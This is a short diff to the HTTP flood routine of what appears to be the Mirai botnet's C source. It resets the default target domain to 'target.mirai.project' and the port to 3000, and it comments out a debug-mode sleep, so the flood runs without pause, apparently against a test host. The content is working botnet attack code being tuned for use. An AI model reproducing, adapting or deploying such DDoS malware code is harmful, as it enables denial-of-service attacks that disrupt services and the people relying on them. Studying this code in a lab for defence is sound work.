@@ -29,10 +29,12 @@ void attack_app_http(uint8_t targs_len, struct attack_target *targs, uint8_t opt
     struct attack_http_state *http_table = NULL;
     char *postdata = attack_get_opt_str(opts_len, opts, ATK_OPT_POST_DATA, NULL);
     char *method = attack_get_opt_str(opts_len, opts, ATK_OPT_METHOD, "GET");
-    char *domain = attack_get_opt_str(opts_len, opts, ATK_OPT_DOMAIN, NULL);
+    //char *domain = attack_get_opt_str(opts_len, opts, ATK_OPT_DOMAIN, NULL);
+    char *domain = attack_get_opt_str(opts_len, opts, ATK_OPT_DOMAIN, "target.mirai.project");
     char *path = attack_get_opt_str(opts_len, opts, ATK_OPT_PATH, "/");
     int sockets = attack_get_opt_int(opts_len, opts, ATK_OPT_CONNS, 1);
-    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 80);
+    //port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 80);
+    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 3000);
 
     char generic_memes[10241] = {0};
 
@@ -47,6 +49,7 @@ void attack_app_http(uint8_t targs_len, struct attack_target *targs, uint8_t opt
 
     if (util_strlen(method) > 9)
         return;
+        
 
     // BUT BRAH WHAT IF METHOD IS THE DEFAULT VALUE WONT IT SEGFAULT CAUSE READ ONLY STRING?
     // yes it would segfault but we only update the values if they are not already uppercase.
@@ -845,8 +848,8 @@ void attack_app_http(uint8_t targs_len, struct attack_target *targs, uint8_t opt
 #ifdef DEBUG
         if (sockets == 1)
         {
-            printf("debug mode sleep\n");
-            sleep(1);
+            //printf("debug mode sleep\n");
+            //sleep(1);
         }
 #endif
     }
